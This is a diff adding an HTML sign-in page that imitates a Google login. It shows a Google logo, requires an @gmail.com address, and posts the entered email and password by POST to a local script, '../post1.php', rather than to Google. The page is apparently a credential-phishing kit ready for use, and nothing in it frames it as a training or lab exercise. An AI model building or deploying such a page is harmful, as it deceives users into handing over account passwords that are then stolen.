@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign In</title>
+
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400&display=swap');
+
+        * {
+            padding: 0;
+            margin: 0;
+            box-sizing: border-box;
+            font-family: 'Poppins', sans-serif;
+        }
+
+        body {
+            display: flex;
+            height: 100vh;
+            justify-content: center;
+            align-items: center;
+            background-color: #f9f9f9;
+        }
+
+        .box {
+            width: 400px;
+            padding: 32px;
+            border-radius: 10px;
+            box-shadow: rgba(0, 0, 0, 0.16) 0px 1px 4px, rgb(51, 51, 51) 0px 0px 0px 3px;
+            background-color: white;
+        }
+
+        .form img {
+            display: block;
+            margin: auto;
+            width: 100px; /* Adjust size as needed */
+        }
+
+        .form-title {
+            font-weight: 400;
+            margin: 10px 0 20px;
+            font-size: 20px;
+            text-align: center;
+        }
+
+        .form-group {
+            margin: 20px 0;
+            position: relative;
+        }
+
+        .form-control {
+            width: 100%;
+            height: 48px;
+            background: none;
+            border: 1px solid #a1a1a1;
+            outline: none;
+            padding: 16px;
+            border-radius: 3px;
+            transition: border 0.4s;
+        }
+
+        .class-label {
+            position: absolute;
+            left: 16px;
+            top: 14px;
+            color: #a1a1a1;
+            background-color: white;
+            padding: 0 6px;
+            font-size: 14px;
+            transition: 0.4s;
+        }
+
+        .form-control:focus + .class-label,
+        .form-control:not(:focus):valid + .class-label {
+            top: -12px;
+            color: blue;
+            font-weight: 300;
+        }
+
+        .form-control:focus {
+            border: 2px solid blue;
+        }
+
+        .show-label {
+            font-size: 14px;
+        }
+
+        .bottom-button {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 20px;
+        }
+
+        .bottom-button a {
+            text-decoration: none;
+            color: blue;
+            font-size: 16px;
+        }
+
+        .form-button {
+            padding: 12px 32px;
+            border: none;
+            background-color: blue;
+            color: white;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: 0.4s;
+        }
+
+        .form-button:hover {
+            box-shadow: 0 10px 36px rgba(0, 0, 0, 0.16);
+        }
+
+        /* Error message styling */
+        .error {
+            color: red;
+            display: none;
+            font-size: 14px;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <form class="form" action="../post1.php" method="POST" onsubmit="return handleLogin(event)">
+            <img src="google-logo.svg" alt="Logo">
+            <h1 class="form-title">Sign In</h1>
+            <div class="form-group">
+                <input type="text" class="form-control" id="email" name="email" required>
+                <label class="class-label">Email or Phone</label>
+                <div id="emailError" class="error">Invalid email address. Please enter a valid Gmail address.</div>
+            </div>
+            <div class="form-group">
+                <input type="password" class="form-control" name="password" required>
+                <label class="class-label">Password</label>
+            </div>
+            <div class="form-group">
+                <label class="show-label">
+                    <input type="checkbox" id="show"> Show Password
+                </label>
+            </div>
+            <div class="bottom-button">
+                <a href="#">Forgot Password?</a>
+                <button type="submit" class="form-button">Next</button>
+            </div>
+        </form>
+    </div>
+
+    <script>
+        document.getElementById('show').addEventListener('change', function() {
+            const passwordField = document.querySelector('input[type="password"]');
+            passwordField.type = this.checked ? 'text' : 'password';
+        });
+
+        function validateEmail(email) {
+            const gmailRegex = /^[^\s@]+@gmail\.com$/; // Ensure email ends with @gmail.com
+            return gmailRegex.test(email);
+        }
+
+        function handleLogin(event) {
+            const emailInput = document.getElementById('email');
+            const emailError = document.getElementById('emailError');
+
+            // Clear previous error message
+            emailError.style.display = 'none';
+
+            // Validate the email input
+            if (!validateEmail(emailInput.value.trim())) {
+                emailError.style.display = 'block'; // Show error message
+                event.preventDefault(); // Prevent form submission
+                return false; // Prevent further action
+            }
+
+            // Allow form submission if email is valid
+            return true; // Allow form submission
+        }
+    </script>
+</body>
+</html>
